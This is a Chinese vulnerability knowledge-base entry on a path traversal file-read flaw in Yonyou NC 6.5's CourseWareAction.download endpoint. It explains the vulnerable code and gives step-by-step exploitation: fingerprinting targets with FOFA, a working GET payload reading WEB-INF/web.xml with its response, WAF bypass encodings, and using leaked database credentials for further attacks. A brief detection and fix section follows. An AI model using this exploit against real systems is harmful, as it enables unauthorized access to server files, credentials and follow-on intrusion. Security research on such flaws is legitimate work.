---
id: web-java-component-yonyou-nc65-courseware-download-fileread
title: 用友 NC 6.5 CourseWareAction.download fileName 路径穿越任意文件读取（web.xml 回显）
type: scenario
domain: web
path: web/java/component
technique: yonyou-nc-courseware-download-filename-traversal-read
tags:
- java
- yonyou
- nc
- arbitrary-file-read
- path-traversal
- download
- hrss
- webxml
cve: []
severity: high
confidence: high
affected_versions: 用友 NC 6.5
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V196
  verified_at: '2026-11-06T22:39:29+08:00'
  notes: 已对照原文与3张截图核对：pubhrss_pub.jar、CourseWareAction.download 源码、CodeGenUtils.buildFileURL(NCHome,{"ware",fileName})、200/4491字节 web.xml 回显均一致；affected_versions 已按原文规范为“用友 NC 6.5”；无 sources 字段；未复跑
url: /docs/web/java/component/web-java-component-yonyou-nc65-courseware-download-fileread/
draft: false
kb_aliases:
- 用友 NC 任意文件读取
- downCourseWare 文件读取
- CourseWareAction.download
- fileName 路径穿越
- pubhrss_pub.jar
- 用友 NC6.5 文件读取
---

## 一句话结论

用友 NC 6.5 的 `CourseWareAction.download()`（`pubhrss_pub.jar` 的 `hrss` 包）从请求参数 `fileName` 取值后只做编码转换，就用 `CodeGenUtils.buildFileURL(NCHome, new String[]{"ware", fileName})` 拼出文件路径并 `FileInputStream` 读入响应；没有规范化、没有 `..` 拦截、没有目录白名单，攻击者用 `fileName=../webapps/nc_web/WEB-INF/web.xml` 即可穿越出 `ware` 目录，读取并下载 `web.xml` 等任意站点文件。

## 原理

- **入口**：`CourseWareAction` 位于 `modules/hrss/lib/pubhrss_pub.jar`，`@Action public void download()` 直接执行 `String fileName = this.request.getParameter("fileName");`。
- **仅做编码转换**：`fileName = StringUtil.convertToCorrectEncoding(fileName);` 只处理字符集（如 GBK/UTF-8 转换），不解析路径、不拒绝 `..`、不检查绝对路径。
- **拼接 sink**：`String strSrcDir = CodeGenUtils.buildFileURL(RuntimeEnv.getInstance().getNCHome(), new String[]{"ware", fileName});` 把 `NCHome/ware/<fileName>` 拼成路径；`fileName` 中的 `../` 会逐级上跳，最终可指向 `NCHome/webapps/nc_web/WEB-INF/web.xml` 等任意文件。
- **读取与回显**：`File file = new File(strSrcDir); FileInputStream fileInput = new FileInputStream(file); BufferedInputStream ...; byte[] pngBytes = new byte[bufferedInputStream.available()]; bufferedInputStream.read(pngBytes);` 随后 `response.reset()`、设置 `Content-Type: APPLICATION/OCTET-STREAM`、`Content-Disposition: attachment;filename=...`，把字节写入响应。因此有回显：文件内容直接作为下载响应返回。
- **为什么默认可达**：该方法没有在代码里做会话/权限判断（文章只给 Action 代码）；PoC 额外带上 `pageId=login`，可能用于通过 portal 路由/登录过滤器（文章未解释具体作用），说明实际访问需要满足 portal 侧的路径要求，但漏洞方法本身没有校验文件路径。
- **危害**：可读取 `WEB-INF/web.xml`、`WEB-INF/classes` 下的配置、数据库连接串、密钥、NCHome 下的配置文件等；这些信息可进一步用于数据库访问、会话伪造或后续 RCE。

## 触发条件

- 目标为用友 NC 6.5（文章明确影响版本），`CourseWareAction` 存在且 `/portal/pt/downCourseWare/download` 可达。
- `fileName` 参数可控，应用进程对目标文件有读权限。
- 请求能通过 portal 的前置路由/过滤器；PoC 使用 `pageId=login`，具体是否必需取决于部署。
- `NCHome/ware` 路径存在（通常存在；`../` 从该目录向上穿越）。

## 利用步骤

1. 用 FOFA `app="用友-UFIDA-NC"` 等指纹定位用友 NC 资产，确认 `/portal/pt/downCourseWare/download` 路由存在。
2. 发送 `GET /portal/pt/downCourseWare/download?fileName=../webapps/nc_web/WEB-INF/web.xml&pageId=login`，确认响应为 200、`Content-Type: APPLICATION/OCTET-STREAM` 且正文为 XML。
3. 调整 `../` 层数/路径读取其他文件：`WEB-INF/web.xml`、`WEB-INF/classes` 下的配置、`NCHome` 下的 `prop.xml`/数据库配置等；以响应内容判断路径是否正确。
4. 若 `..` 被拦截，尝试 URL 编码 `%2e%2e%2f`、双编码 `%252e%252e%252f`、反斜杠 `..\`（Windows）或大小写/多余斜杠变体。
5. 读取到数据库连接串/密钥后，评估是否可进一步访问数据库或伪造会话；把文件读取结果用于后续利用。

## PoC

```http
GET /portal/pt/downCourseWare/download?fileName=../webapps/nc_web/WEB-INF/web.xml&pageId=login HTTP/1.1
Host: target
```

```http
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Content-disposition: attachment;filename=../webapps/nc_web/WEB-INF/web.xml
Content-Type: APPLICATION/OCTET-STREAM;charset=UTF-8
Content-Length: 4491

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" ...>
<web-app ...>
  <listener><listener-class>nc.bs.framework.server.WebApplicationStartupHook</listener-class></listener>
  <filter><filter-name>LoggerFilter</filter-name><filter-class>nc.bs.framework.server.LoggerServletFilter</filter-class></filter>
  ...
</web-app>
```

## 变体与关联

- 变体：路径穿越深度按 `NCHome` 与 `ware` 的实际相对位置调整；Windows 可用 `..\..\`，Linux 用 `../../`；编码/双编码可绕过简单 WAF。
- 变体：同类“下载接口 fileName 直拼”的 Java 文件读取模式，可见 [[web-generic-file-inclusion-luckyframeweb-download-filename-traversal]]（LuckyFrameWeb `/common/download`）、[[web-generic-file-inclusion-java-new-file-root-path-traversal-read]]（`new File(root, path)` + `FileUtils.readFileToString`）。
- 关联：[[web-generic-auth-yonyou-nc65-portalloginfilter-bypass]]（同 NC 6.5 的 portal 登录过滤器绕过，可能让下载入口在未登录状态下可达）；[[web-java-component-yonyou-nccloud-gateway-reflection-command-injection]]（同产品线的另一个组件入口）。
- 注意：文章未给出该 Action 的鉴权代码；入口是否需要登录、`pageId=login` 的具体作用需按目标部署验证。

## 检测与防御

- 代码层：对 `fileName` 做规范化（`File.getCanonicalPath()`）并校验结果仍位于允许的 `ware` 目录内；拒绝 `..`、绝对路径、盘符、反斜杠和空字节；只允许白名单扩展名/文件。
- 鉴权：下载接口要求登录并校验业务权限；不要只依赖 portal 前置过滤器。
- 运行层：应用进程最小文件读权限；敏感配置（数据库口令、密钥）不要放在 Web 可读目录；WAF 监控 `fileName` 中的 `../`、`%2e%2e`、`..\`。
- 检测：Web 日志中出现 `downCourseWare/download` 且 `fileName` 含 `..`、`WEB-INF`、`web.xml`、`prop.xml`；短时间内下载多个配置文件。
- 修复：安装用友 NC 最新补丁并对接口增加身份验证、修改查询方法逻辑（文章修复建议）。
